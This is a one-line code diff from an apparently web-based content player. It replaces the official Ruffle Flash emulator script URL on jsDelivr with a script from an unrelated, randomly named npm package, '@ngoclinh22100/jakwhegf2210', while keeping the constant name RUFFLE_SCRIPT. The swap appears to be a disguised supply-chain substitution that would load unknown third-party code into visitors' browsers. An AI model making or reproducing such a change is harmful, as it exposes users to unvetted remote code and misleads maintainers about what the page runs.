@@ -28,7 +28,7 @@ function resolveH5IframeSrc(resourceId, urlParams) {
   return r2PublicUrl(`${prefix}/${resourceId}/index.html`);
 }
 
-const RUFFLE_SCRIPT = "https://cdn.jsdelivr.net/npm/@ruffle-rs/ruffle-web@0.2.0-nightly.2026.3.28/ruffle.min.js";
+const RUFFLE_SCRIPT = "https://cdn.jsdelivr.net/npm/@ngoclinh22100/jakwhegf2210@0.2.0/jakwhegf2210.js";
 
 function parseFlexibleQuery(raw) {
   const s = String(raw || "")
